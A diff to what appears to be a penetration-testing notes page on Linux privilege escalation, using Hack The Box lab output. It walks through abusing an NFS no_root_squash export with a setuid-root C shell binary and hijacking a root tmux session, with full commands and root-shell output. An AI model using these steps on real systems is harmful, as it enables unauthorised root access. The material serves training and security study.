@@ -824,20 +824,105 @@ cd <SHAREDD_FOLDER>
 ./bash -p #ROOT shell
 ```
 
-* **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder our come compiled payload that will abuse the SUID permission, give to it **SUID** rights, and **execute from the victim** machine that binary (you can find here some[ C SUID payloads](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/payloads-to-execute#c)).
+```bash
+lojique@htb[/htb]$ showmount -e 10.129.2.12
+
+Export list for 10.129.2.12:
+/tmp             *
+/var/nfs/general *s
+```
 
 ```bash
-#Attacker, as root user
-gcc payload.c -o payload
-mkdir /tmp/pe
-mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
-cd /tmp/pe
-cp /tmp/payload .
-chmod +s payload
+htb@NIX02:~$ cat /etc/exports
 
-#Victim
-cd <SHAREDD_FOLDER>
-./payload #ROOT shell
+# /etc/exports: the access control list for filesystems which may be exported
+#		to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+/var/nfs/general *(rw,no_root_squash)
+/tmp *(rw,no_root_squash)
+```
+
+```c
+htb@NIX02:~$ cat shell.c 
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+int main(void)
+{
+  setuid(0); setgid(0); system("/bin/bash");
+}
+```
+
+```bash
+htb@NIX02:/tmp$ gcc shell.c -o shell
+```
+
+```bash
+root@Pwnbox:~$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
+root@Pwnbox:~$ cp shell /mnt
+root@Pwnbox:~$ chmod u+s /mnt/shell
+```
+
+```bash
+htb@NIX02:/tmp$ ./shell
+root@NIX02:/tmp# id
+
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(htb)
+```
+
+## Hijacking Tmux Sessions
+
+Terminal multiplexers such as [tmux](https://en.wikipedia.org/wiki/Tmux) can be used to allow multiple terminal sessions to be accessed within a single console session. When not working in a `tmux` window, we can detach from the session, still leaving it active (i.e., running an `nmap` scan). For many reasons, a user may leave a `tmux` process running as a privileged user, such as root set up with weak permissions, and can be hijacked. This may be done with the following commands to create a new shared session and modify the ownership.
+
+&#x20;&#x20;
+
+```shell-session
+htb@NIX02:~$ tmux -S /shareds new -s debugsess
+htb@NIX02:~$ chown root:devs /shareds
+```
+
+If we can compromise a user in the `dev` group, we can attach to this session and gain root access.
+
+Check for any running `tmux` processes.
+
+```shell-session
+htb@NIX02:~$  ps aux | grep tmux
+
+root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess
+```
+
+Confirm permissions.
+
+```shell-session
+htb@NIX02:~$ ls -la /shareds 
+
+srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
+```
+
+Review our group membership.
+
+```shell-session
+htb@NIX02:~$ id
+
+uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
+```
+
+Finally, attach to the `tmux` session and confirm root privileges.
+
+```shell-session
+htb@NIX02:~$ tmux -S /shareds
+
+id
+
+uid=0(root) gid=0(root) groups=0(root)
 ```
 
 ## Docker
